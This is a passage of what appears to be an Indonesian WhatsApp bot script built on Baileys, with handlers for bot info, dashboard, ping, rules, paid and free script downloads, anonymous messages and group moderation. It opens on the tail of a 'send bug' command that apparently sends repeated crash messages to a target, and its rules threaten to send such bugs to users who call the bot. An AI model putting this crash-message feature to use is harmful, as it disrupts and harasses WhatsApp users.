"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
setReply (`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
 // ======== FITUR INFO =========//
case "disk":{
exec('cd && du -h --max-depth=1', (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
break
case 'tqto':
case 'thanksto':
let teksTqto = `${thanksto(prefix)}`
sendButImg(teksTqto,'https://pomf2.lain.la/f/64xz8fun.jpg','Script','sc')
           
break
case 'infobot': case 'sc': {
 

    
    let infobt = `🌟 Hai ${ucapanWaktu}, Kak ${pushname}! 🌟

${gris}📌 - INFO BOT:${gris}

${gris1}Nama Bot: ${botName}
Nama Creator: ${ownerName}
Versi: ${baileysVersion}
Tipe Bot: Case & Plugins
Menhera Awalnya Memakai Script Dari :${gris1} https://github.com/officialdittaz/Amelia-Botz

${gris}📱 - SOSMED BOT:${gris}

${gris}YouTube:${gris} ${syt}
${gris}TikTok${gris}: https://www.tiktok.com/@asuna__kirito 
${gris}Instagram${gris}: https://www.instagram.com/p.u.t8

${gris1}${pushname}, ${botName} adalah Bot WhatsApp yang dirancang secara mendetail untuk menemani aktivitas virtual Anda di sosial media. Dengan ${botName}, Anda dapat menikmati berbagai fitur, mulai dari mengunduh media, belajar, bermain game, hingga berjualan dan masih banyak lagi.${gris1}

${gris1}✨ Tentang Owner: ${ownerName} saat ini sedang dalam proses pembelajaran tentang pengembangan bot WhatsApp. Ia berkomitmen untuk terus berkembang dan memberikan yang terbaik. Mari kita dukung perjalanan ini dan bersabar, karena setiap langkah kecil akan membawa kita ke pencapaian yang lebih besar!${gris1}

${gris}🙏 Terima Kasih: Kami juga ingin mengucapkan terima kasih kepada semua yang telah mengajarkan dan berbagi pengetahuan tentang cara membuat bot WhatsApp kepada creator lainnya. Kontribusi Anda sangat berarti dalam mengembangkan komunitas ini!${gris}

${gris}⚠️ Catatan: Jika terjadi masalah atau kesalahan dalam penggunaan bot ini, mohon dimaklumi karena bot ini masih dalam tahap pengembangan. Kami sangat menghargai masukan dan saran dari Anda untuk meningkatkan kualitas bot ini.${gris}

${gris}Terima kasih telah menggunakan ${botName}, dan selamat beraktivitas!${gris} 🌈`;

    const { proto, generateWAMessageFromContent } = require('baileys');
    const messageContent = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: infobt,
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© ɴᴀʜɪᴅᴀ - ᴍᴅ",
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": JSON.stringify({
                                    "display_text": "Script nahida",
                                    "id": `${prefix}scnahida` // Menggunakan prefix yang sudah didefinisikan
                                }),
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": JSON.stringify({
                                    "display_text": "Script Free",
                                    "id": `${prefix}scfree` // Pastikan variabel 'sn' sudah didefinisikan sebelumnya
                                }),
                            },
                        ],
                    }),
                }),
            },
        },
    };

    let msgs = generateWAMessageFromContent(m.chat, messageContent, { quoted: m, userJid: m.sender });

    // Mengirim pesan
    await hanz.relayMessage(m.chat, msgs.message, { messageId: msgs.key.id });
}
break;
case 'dashboard':{
const getFolderSize = (await import("get-folder-size")).default;
let storage = await getFolderSize.loose('.');
let moduls = await getFolderSize.loose('./node_modules');
let session = await getFolderSize.loose('./session')
let databse = await getFolderSize.strict('./database/database.json');
for (let i of hitnya){
let cekvipp = ms(i.expired - Date.now())
var resetnye = `${cekvipp.hours} jam ${cekvipp.minutes} menit`
}
let teks = Ehztext(`
––––––『 *Dashboard* 』––––––
⭔ *Runtime* : ${runtime(process.uptime())}
⭔ *Reset* : ${resetnye}
⭔ *Total Hit* : ${thisHit.toLocaleString()}
⭔ *Storage* : ${FileSize(storage)}
⭔ *Modules* : ${FileSize(moduls)}
⭔ *Session* : ${FileSize(session)}
⭔ *Database* : ${FileSize(databse)}
`)
let gcHit = `\n\n*–––––––––『 Group Hit 』–––––––––*\n`
    let data = db.data.chats
    for (let key in data) {
        if (data[key].hasOwnProperty('hit')) {
          gcHit += '⭔ ' + data[key].name + " : " + data[key].hit+'\n'
        }
    }
let fall = Ehztext("––––––『 *Commands Today* 』––––––\n")
let totalFail =[]
let totalSuc = []
let total = 0
let tot = 0
await dash.map(async function(e, i){
fall += " ⭔ "+` *${e.cmd}* : ${e.succes+e.failed} \n`
await totalFail.push(e.failed)
await totalSuc.push(e.succes)
});

for(let i = 0; i < totalFail.length; i++){
total += totalFail[i]
}

for(let a = 0; a < totalSuc.length; a++){
tot += totalSuc[a]
}

let akoh = Ehztext(`Total : ${dash.length} used`)
let tod = Ehztext("––––––『 *Commands Failed* 』––––––\n")
let filteredArray = await dash.filter(item => item.failed > 0 )
await filteredArray.map(async function(e, i){
tod += " ⭔ "+` *${e.cmd}* : ${e.failed} \n`

});
let aw = `Total : ${filteredArray.length} failed`
let tekz = teks+"\n\n"+fall+"\n"+akoh+"\n\n"+"––––––『 *Commands Status* 』––––––\n"+" ⭔ *Succes* : "+tot+"\n"+" ⭔ *Failed* : "+total+"\n\n"+tod+"\n\n"+gcHit +"\n\n"


   


let link = 'https://telegra.ph/file/b659d66189445cab43a25.jpg'
//conn.sendAdReply(from,tekz,copyright,baileysVersion,link,{quoted:m})
setReply(tekz)
}
break
case 'owner': case 'creator': {
  const p = `${global.nomerOwner || '6281316643491'}`; // Pastikan nomor owner ada
  let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? hanz.user.jid : m.sender
    let pp = await hanz.profilePictureUrl(who).catch(_ => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60')
  let owner = `wa.me/${p}`;
  
  let vcard = `
BEGIN:VCARD
VERSION:3.0
N:Sy;Bot;;;
FN:${ownerName || 'Owner Name'}
item.ORG:✍️ Masih Belajar Bwang Jangan Dibully
item1.TEL;waid=${p}:${p}
item1.X-ABLabel:📞 Nomor Owner
item2.EMAIL;type=INTERNET:nahidaofficial@gmail.com
item2.X-ABLabel:📧 Email
item3.ADR:;; Riau, Indonesia;;;;
item3.X-ABADR:ac
item3.X-ABLabel:📍 Region
item4.URL:https://github.com/VinnKanaichi
item4.X-ABLabel:🌐 Website
item5.X-ABLabel:© ɴᴀʜɪᴅᴀ - ᴍᴅ
END:VCARD`.trim();
  
  const sentMsg = await hanz.sendMessage(m.chat, {
    contacts: {
      displayName: ownerName || 'Owner',
      contacts: [{ vcard }]
    },
    contextInfo: {
      externalAdReply: {
        title: `${botName || 'Bot Name'}`,
        body: `Hai ${ucapanWaktu || 'Selamat'} ${pushname || 'Pengguna'}`,
        thumbnailUrl: 'https://pomf2.lain.la/f/5u23mr8p.jpg',
        sourceUrl: null,
        mediaType: 1,
        showAdAttribution: true,
        renderLargerThumbnail: true
      }
    }
  }, { quoted: m });
  
  
   let tksOwner = `🌟 Hai Kak @${sender.split("@")[0]}! 🌟

${gris1}Perkenalkan, ini adalah Owner ku! Dia sedang dalam perjalanan belajar untuk menjadi yang terbaik dalam bidang ini. Jika ada yang ingin kamu tanyakan atau butuh bantuan, jangan ragu untuk menghubunginya!

Ingat, lebih baik memiliki sedikit teman yang dapat membantumu daripada banyak teman yang hanya mencari ketenaran. Mari kita tumbuh bersama dan saling mendukung! 💪✨${gris1}`
  hanz.editmsg(m.chat,tksOwner,m)
}
break;
case 'ping': {
	const used = process.memoryUsage();
	let timestamp = speed();
	let latensi = speed() - timestamp;
	let neww = performance.now();
	let oldd = performance.now();
	const cpus = os.cpus();
	let cpuUsage = cpus.map((cpu, i) => {
		let total = Object.values(cpu.times).reduce((acc, tv) => acc + tv, 0);
		let percentage = Math.round((cpu.times.user / total) * 100);
		return `CPU ${i + 1}: ${percentage}% digunakan`;
	}).join('\n');
	let serverUptime = os.uptime();
	let formatUptime = (seconds) => {
		const h = Math.floor(seconds / 3600);
		const m = Math.floor((seconds % 3600) / 60);
		const s = seconds % 60;
		return `${h} Jam, ${m} Menit, ${s} Detik`;
	};
	let nodeVersion = process.version;
	let formatBytes = (bytes) => {
		const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
		if (bytes === 0) return '0 Byte';
		const i = Math.floor(Math.log(bytes) / Math.log(1024));
		return `${Math.round(bytes / Math.pow(1024, i))} ${sizes[i]}`;
	};
	

	let respon = Ehztext(`
	*Kecepatan Respon*: ${latensi.toFixed(4)} _Second_

	
	*Info Server*:
	- RAM: ${formatBytes(os.totalmem() - os.freemem())} / ${formatBytes(os.totalmem())}
	- Platform: ${os.platform()}
	- Arsitektur: ${os.arch()}
	- Uptime Server: ${formatUptime(serverUptime)}
	- Node.js Version: ${nodeVersion}
	- Total CPU: ${cpus.length}
	- CPU Info:
	${cpuUsage}

	_NodeJS Memory Usage_:
	${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v => v.length)), ' ')}: ${formatBytes(used[key])}`).join('\n')}
	`).trim();

	setReply(respon);
}
break;
case 'rules':{
    let teks =`
    ${gris1}Syarat dan Ketentuan menggunakan *${botName}*

1. Nama dan nomer user ${botName}
akan Kami simpan di dalam
server selama bot aktif

2. Data akan di hapus ketika bot Offline
atau di hapus oleh Owner Bot

3. Kami tidak menyimpan gambar,
video, file, audio, dan dokumen
yang kamu kirim ke ${botName}

4. Kami tidak akan pernah meminta users
untuk memberikan informasi pribadi

5. Jika menemukan Bug/Error silahkan
langsung lapor ke Owner atau Developer
atau bisa juga memakai fitur _*laporerror*_

6. Beberapa fitur mungkin ada yang error,
jadi tunggu sampai developer
meperbaiki fitur tersebut

8. Bot ini sudah di lengkapi dengan
fitur _*Auto laporerror*_ jika terjadi
error maka bot akan auto report ke
developer, terkecuali error yang
 menyebabkan bot mati, maka user
 harus lapor ke developer

7. Bot ini juga sudah di lengkapi dengan
Fitur Anti Spam jika kamu terdeteksi
melakukan spam, maka Bot tidak
akan menanggapi kamu selama 20 detik

9. User dilarang keras menelpon bot!
jika melanggar maka kamu akan terkena
banned,block dan dikirim bug

10. Bot tidak akan menanggapi user yang
meminta untuk di save nomernya${gris1}`
   hanz.editmsg(m.chat,teks,m)
    
    }
    break
case 'scnahida': {
      await loading()
const { downloadContentFromMessage,generateWAMessageFromContent,proto,prepareWAMessageMedia,generateWAMessageContent } = require("baileys")
let name = m.pushName || hanz.getName(m.sender);

let pan = `Hai ${pushname} ${gris1}Berikut Adalah Script Menhera Tipe Case&plugins\n Script Bot Tahap Demi Tahap Akan Update${gris1}

${gris}Gambar Hanya Pemanis+Belum Kumplit Yang Lebih Real/kumplit Silakan Cek Nomor Bot nahida${gris}
\n${wm}• 
`;
const url = thumb
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: hanz.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: pan
          },
          carouselMessage: {
            cards: [
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url:"https://telegra.ph/file/dd667063936e08a926c02.jpg" } }, { upload: hanz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: '',
          hasMediaAttachment: false
        }),
                body: {
                  text: `${gris}Tampilan Connsole${gris}`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"url","url":"https://wa.me/628388198229","merchant_url":"https://wa.me//628388198229"}`
                    },
                  ],
                },
              },{
               header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url:"https://pomf2.lain.la/f/t3jqp4ej.jpg" } }, { upload: hanz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: '',
          hasMediaAttachment: false
        }),
                body: {
                  text: `${gris}Untuk Keamanan Group${gris}`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"url","url":"https://wa.me/628388198229","merchant_url":"https://wa.me//628388198229"}`
                    },
                  ],
                },
              },{
              header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url:"https://telegra.ph/file/ea497eec768de2d5642b3.jpg" } }, { upload: hanz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: '',
          hasMediaAttachment: false
        }),
                body: {
                  text: `${gris}1 Sc 2 Tipe Yaitu Bisa Add Fitur Case Sama Plugin${gris}`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"url","url":"https://wa.me/628388198229","merchant_url":"https://wa.me//628388198229"}`
                    },
                  ],
                },
              },{
              header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url:"https://telegra.ph/file/31afb18128ad48320562c.jpg" } }, { upload: hanz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: '',
          hasMediaAttachment: false
        }),
                body: {
                  text: `${gris}Fitur Panel Pterodactyl 📡 fix Button${gris}`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"url","url":"https://wa.me/628388198229","merchant_url":"https://wa.me//628388198229"}`
                    },
                  ],
                },
              },{
              header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url:"https://telegra.ph/file/e48eae64477b56992f96e.jpg" } }, { upload: hanz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: '',
          hasMediaAttachment: false
        }),
                body: {
                  text: `${gris}Fitur Top Up 💸 Fix Button${gris}`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"url","url":"https://wa.me/628388198229","merchant_url":"https://wa.me//628388198229"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url:"https://telegra.ph/file/d4e799f0603e025955cb6.jpg" } }, { upload: hanz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: '',
          hasMediaAttachment: false
        }),
                body: {
                  text: `${gris}setting Tampilan SETMENU & SETREPLY${gris}`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"url","url":"https://wa.me/628388198229","merchant_url":"https://wa.me//628388198229"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);

await hanz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});
await sendButDoc('Jika Berminat Silakan Hubungi Owner','💸Payment','qris')
}
break

case 'scfree': {
   let linksc = `${gris}📥 List Download Script Menhera Free${gris}

   _Nikmati beragam versi Menhera untuk kebutuhan Anda. Untuk performa terbaik, disarankan menggunakan versi terbaru!_

   1. *Menhera V1*
      [Download](https://www.mediafire.com/file/aia0895z8rl6h5y/Menhara-Chan_V1.zip/file)

   2. *Menhera V2*
      [Download](https://www.mediafire.com/file/3y6yztdbu8i6r4f/MenharaV2.zip/file)

   3. *Menhera V3*
      [Download](https://www.mediafire.com/file/hkzg8rczhn0s0oi/Menhera-V3.zip/file)

   4. *Menhera Case & Plug*
      [Download](https://www.mediafire.com/file/8w5pgdy6uf6jaln/M%25D2%25BD%25C9%25B3%25D4%258B%25D2%25BD%25C9%25BE%25CE%25B1_%25D0%25BC%25C3%2590%25E1%25B6%259C%25E1%25B4%25B6%25CB%25A2_6_September_2024.zip/file)

   5. *Menhera V6.0.0 (Versi Terbaru!)*
      [Download](https://www.mediafire.com/file/sul2rc71ld389eg/Menhera_V6.0.0.zip/file)

   ${gris}Selamat mencoba! Versi berikutnya segera hadir! 🚀${gris}`;
   sendAnti(linksc);
}
break;

case 'laporerror':{
if (!args[0]) return setReply(`Contoh:\n.laporerror menu tidak muncul`)
let duhhh = q.split('|')[0]
let text12 = Ehztext(`「 *Report Bug* 」
*Pesan:* ${duhhh}
*Dari:* @${sender.split('@')[0]}`)
setReply(`Oke Kak Reportmu Sudah Terkirim Ke Owner`)
hanz.sendMessage(nomerOwner + "@s.whatsapp.net",{image: { url: pickRandom(fotoRandom)}, caption: text12, mentionedJid:[m.sender], quoted: m })
}
break
case 'sewa': case 'sewabot': {
var sewanya = dada(prefix, pushname, ucapanWaktu)      
let teksSewa = Ehztext(sewanya)
sendButDoc (teksSewa,'Payment','qris')
}
break 
case 'qris':
case 'bayar':
case 'donasi':
let data1 = global.db.data.others['runtime']
let time1 = (new Date - data1.runtime) || 'lamanya'
let qrnya = ' _Nih kakak Tinggal Scan Aja QR ini Dan Masukan Nominal Nya_'
hanz.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `${botName}`,
body:`aktif selama ${clockString(time1)}`,
previewType:"PHOTO", 
thumbnail:thumb,
sourceUrl:`${web}`
}}, image: { url: 'https://telegra.ph/file/a10591314e61677cd6251.jpg' }, caption: qrnya}, { quoted: ftoko })
break
case 'speed':
	setReply(`Speed: ${latensi.toFixed(4)} Second`)
	break       
		   
	case 'runtime':{
    let data = global.db.data.others['runtime']
let time = (new Date - data.runtime) || 'lamanya'
    setReply (`⏰ Bot aktif selama ${clockString(time)}`)
  }
	break
// ========= FITUR ANONYMOUS =========//
case 'pesanrahasia':
case 'menfes':
case 'confes': {
    if (isGroup) return setReply('Khusus Private Chat Bot');
    if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit();

    try {
        if (args.length < 1) return setReply(`Penggunaan: ${prefix + command} 62xnxx|dari siapa|pesan rahasia`);
        
        let nomor = q.split("|")[0].replace(new RegExp("[^0-9]", "gi"), ""); // Mengambil nomor dan hanya menyimpan angka
        let org = q.split("|")[1]; // Pengirim pesan
        let dari = q.split("|")[2]; // Isi pesan rahasia

        // Cek apakah nomor diawali dengan "62" (kode internasional Indonesia)
        if (!nomor.startsWith('62')) return setReply('Nomor harus diawali dengan 62');
        if (nomor.length < 10 || nomor.length > 15) return setReply('Format nomor tidak valid, periksa kembali.');

        // Mengambil gambar thumbnail
        let gambar = 'https://telegra.ph/file/0a45359703b3a8fdffb8c.jpg'; // Link gambar tetap atau dapat disesuaikan

        // Membuat isi pesan yang akan dikirim ke penerima
        let pesan = `${ucapanWaktu} kak, ada Pesan Rahasia nih buat kamu!

Dari: *${org}*
*Pesan:* "${dari}"

Note:
Untuk membalas pesannya cukup ketik ${prefix}balaspesan <teks> contoh: ${prefix}balaspesan dari siapa??
Untuk keluar dari pesannya cukup ketik .keluar atau diabaikan juga bisa.

© ɴᴀʜɪᴅᴀ - ᴍᴅ`;

        // Mengirim pesan dengan thumbnail menggunakan contextInfo
        await hanz.sendMessage(nomor + '@s.whatsapp.net', {
            text: pesan,
            contextInfo: {
                externalAdReply: {
                
                    title: "Pesan Rahasia",
                    body: org,
                    previewType: "PHOTO",
              
                    thumbnail: fs.readFileSync('./stik/menfes.jpg'),// Menggunakan gambar sebagai thumbnail
                    sourceUrl: '' // Jika ada URL tambahan, bisa ditambahkan di sini
                }
            }
        }, { quoted: null });

        await sleep(1500);

        // Memberi tahu pengirim bahwa pesan berhasil dikirim
        hanz.sendMessage(from, {
            text: `Sukses mengirim pesan rahasia, tunggu balasannya ya kak.\nJika tidak dibalas, kirim *${prefix}stop* untuk keluar dari room chat.`
        }, { quoted: fkontak });

    } catch (err) {
        console.log(err);
        setReply(`*Ketik yang benar dong kak!*\nContoh: ${prefix + command} 62xxx|dari siapa|pesan rahasia`);
    }

    db.data.users[sender].limit -= 1;
}
break;
 case 'balaspesan':
case 'balasmenfess':
case 'startmenfes': {
    if (isGroup) return setReply('Fitur ini hanya bisa digunakan di Chat Bot!');
    
    // Memeriksa apakah nomor tujuan sudah diinput
    if (!q) return setReply("Masukkan nomor yang ingin di-chat");
    
    // Memeriksa apakah pengguna sudah berada dalam chat sebelumnya
    if (roomA || roomB == "CHATTING") return reply(`Kamu masih berada di dalam chat, ketik *${prefix}stop* untuk keluar dari chatmu`);

    let id = + new Date; // ID unik untuk room chat
    const obj = {
        id, // ID untuk room
        a: m.sender, // Pengirim pesan
        b: Input, // Penerima pesan
        state: "CHATTING", // Status chat
        expired: "INFINITY" // Chat tidak akan kedaluwarsa kecuali dihentikan
    };

    // Menambahkan pengguna ke daftar anonymous chat
    anonChat.push(obj);

    // Memberikan balasan bahwa room chat berhasil dibuat
    reply(`Kamu telah membuat room chat sekarang kamu bisa mengirim pesan. Kirim perintah ${prefix}stop untuk keluar dari chat.`);
    
    // Mengirimkan notifikasi ke nomor tujuan
    hanz.sendText(`${Input}@s.whatsapp.net`, `Nomer yang kamu kirim telah menerima pesan kamu\nSekarang kamu bisa mengirim pesan. Ketik *${prefix}stop* untuk keluar.`);
}
break;
case 'stop':
case 'keluar': {
    // Mengecek apakah pengguna berada di dalam room chat dengan status CHATTING
    if (roomA && roomA.state == "CHATTING") {
        // Mengirimkan pesan ke lawan chat bahwa pengirim telah keluar
        await hanz.sendMessage(roomA.b + '@s.whatsapp.net', { text: `Pengirimmu telah meninggalkan chat.` });
        
        // Timeout untuk mengeluarkan pengguna dari room chat
        await setTimeout(() => {
            setReply("Kamu telah keluar dari chat.");
            roomA.a = roomA.b;  // Mengatur pengguna A menjadi B
            roomA.b = "";  // Menghapus lawan chat
            roomA.state = "WAITING";  // Mengubah status room menjadi WAITING
            roomA.expired = Date.now() + toMs("5m");  // Mengatur waktu expired 5 menit
        }, 1000);

    } else if (roomA && roomA.state == "WAITING") {
        // Jika pengguna berada dalam room dengan status WAITING
        reply("Kamu telah keluar dari chat.");
        anonChat.splice(anonChat.indexOf(roomA), 1);  // Menghapus room dari daftar anonymous chat

    } else if (roomB && roomB.state == "CHATTING") {
        // Mengecek apakah pengguna berada di roomB dengan status CHATTING
        await hanz.sendMessage(roomB.a + '@s.whatsapp.net', { text: `Pengirimmu telah meninggalkan chat.` });
        reply("Kamu telah keluar dari chat.");
        
        roomB.b = "";  // Menghapus lawan chat
        roomB.state = "WAITING";  // Mengubah status room menjadi WAITING
        roomB.expired = Date.now() + toMs("5m");  // Mengatur waktu expired 5 menit

    } else {
        // Jika pengguna tidak berada di dalam chat
        reply(`Kamu sedang tidak berada di dalam chat.`);
    }
}
break;
// =≠≠====== FITUR GROUP ===========//
case 'intro':{
let kartIntro = `${gris1}INTRO MEMBARU
-----------------
Nama     : 
Umur     : 
Kelas    : 
Co/Ce    : 
Askot    : 
Hobi     : 
Status   : 
Agama    : 
-----------------
NOTE:
● Status: Jomblo/Pacaran
● Askot: Asal Kota
● Agama: Boleh Di Privat
● Jangan Lupa Baca Deskripsi Grup

SALKEN ALL${gris1}`
m.reply(kartIntro)
}
break
 case 'add': {
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if(!Input) return setReply("Tag/Mention/Masukan nomer target")
if (Input.startsWith('08')) return setReply('Awali nomor dengan 62')
hanz.groupParticipantsUpdate(from, [Input], 'add').then((res) =>{
if(res[0].status == 200) setReply(`Berhasil menambahkan ${Input.split("@")[0]} ke dalam group ${groupName}`)
if(res[0].status == 403) setReply(`Gagal menambahkan ${Input.split("@")[0]} ke dalam group ${groupName}`)
}).catch((err) => setReply(jsonformat(err)))
}
break
case 'kickme':
	try{
	if (!isGroup) return onlyToko()
	await hanz.groupParticipantsUpdate(from, [sender], 'remove')
	await setReply("Mampus wkwkw")
	} catch (err){
	setReply(`${err}`)
	}
	break
case 'kick':
case 'remove': {
    if (!isGroup) return onlyToko();
    if (!isGroupAdmins && !isOwner) return onlyAdmin();
    
    let targetUser;

    // Check if the command is a reply
    if (m.quoted && m.quoted.sender) {
        targetUser = m.quoted.sender;
    } else if (Input) {
        // If an input was provided, validate the number
        if (Input.startsWith('08')) {
            return setReply('Awali nomor dengan 62');
        }
        targetUser = Input; // use the input as target
    } else {
        return setReply("Tag/Mention/Masukan nomor target");
    }

    await hanz.groupParticipantsUpdate(from, [targetUser], 'remove')
        .then((res) => {
            setReply(`User ${targetUser} telah dikeluarkan dari grup.`);
        })
        .catch((err) => {
            setReply(jsonformat(err));
        });
}
break;

case 'addkick':{
if (!isGroup) return onlyToko()
if (!isBotGroupAdmins) return onlyBadmin()
if(!q) return setReply(`Masukan nomer atau reply target`)
let grup = db.data.kickon[from]
let number = Input.split("@")[0]
if(grup){
if(grup.includes(number)) return setReply("Target sudah ada di database")
grup.push(number)
setReply(`Berhasil memasukan ${number} ke dalam target kick
dan telah menandai user sebagai user Biadap`)
} else {
db.data.kickon[from] = []
//grup.push(number)
let teks =`Berhasil memasukan ${number} ke dalam target kick
dan telah menandai user sebagai user Biadap`
setReply(teks)
}
}
break
case 'delkick':{
if (!isGroup) return onlyToko()
//if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if(!q) return setReply(`Masukan nomer atau reply target`)
let grup = db.data.kickon[from]
if(!grup) return setReply("Gunakan fitur addkick terlebih dahulu")
let number = Input.split("@")[0]
grup.splice(grup.indexOf(number,1))
setReply("Berhasil menghapus user dari target kick")
}
break
case 'listkick':{
if (!isGroup) return onlyToko()
let kick = db.data.kickon[from]
if(!kick) return setReply("Group ini tidak memiliki listkick")
let banya = `List Kick\nJumlah : ${kick.length}\n\n`
kick.map(function(e, i){
banya +=(i+1)+`. Nomer : wa.me/${e}\n\n`            
});
setReply(banya)
}
break
case 'promote':
    if (!isGroup) return setReply("Perintah ini hanya dapat digunakan di dalam grup.");
    if (!isGroupAdmins && !isOwner ) return setReply("Hanya admin atau owner yang dapat menggunakan perintah ini.");
    if (!isBotGroupAdmins) return setReply("Bot harus menjadi admin untuk melakukan ini.");

    let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await hanz.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote');
    setReply(mess.succes);
    break;

            case 'demote':
    if (!isGroup && !isGroupAdmins) return onlyAdmin()
    if (!isBotGroupAdmins) return onlyBadmin()
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await hanz.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
                setReply(mess.succes)
                break
case 'kickall': {
  if (!isGroup) return onlyToko()
  if (!isGroupAdmins) return onlyAdmin()
  if (!isBotGroupAdmins) return onlyBadmin()
  const xeonkickall = (args[0] === 'numBut')
  ? q.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${nomerOwner}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${nomerOwner}@s.whatsapp.net`)
      .map(item => item.id);
 if(chat.welcome == false) 
  db.data.chats[from].welcome = false
 for (let remove of xeonkickall) {
 await hanz.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(100);
 }
 setReply(`Success`);
}
break

case 'tagadmin': case 'listadmin':{
    	if (!m.isGroup) return onlyToko()
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = Ehztext(`   
*Group Admins:*
${listAdmin}
`.trim())
    hanz.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
}
break
case 'tagme':{
if (!isGroup) return onlyToko()
let menst = [sender]
hanz.sendMessage(from, { text: `@${senderNumber}`, mentions: menst })
}
break
case 'totag': {
  if (!isGroup) return onlyToko()
 
               if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
               const participants = isGroup ? await groupMetadata.participants : ''
               if (!m.quoted) return reply( `Reply pesan dengan caption ${prefix + command}`)
               hanz.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break
case 'setppgc':{
  if (!isGroup) return onlyToko()
  if (!isGroupAdmins) return onlyAdmin()
  if (!isBotGroupAdmins) return onlyBadmin()
if (isImage || isQuotedImage) {
let media = await hanz.downloadAndSaveMediaMessage(quoted,makeid(5))
await hanz.updateProfilePicture(from, { url: media })
.then( res => {
setReply(`Sukses`)
fs.unlinkSync(media)
}).catch(() => reply(mess.error.api))
} else {
setReply(`Kirim/balas gambar dengan caption ${command}`)
}
}
break
case  'getppgc':
	if (!isGroup) return onlyToko()
	await loading()
	try {
	var ppimg = await hanz.profilePictureUrl(from, 'image')
	} catch (err) {
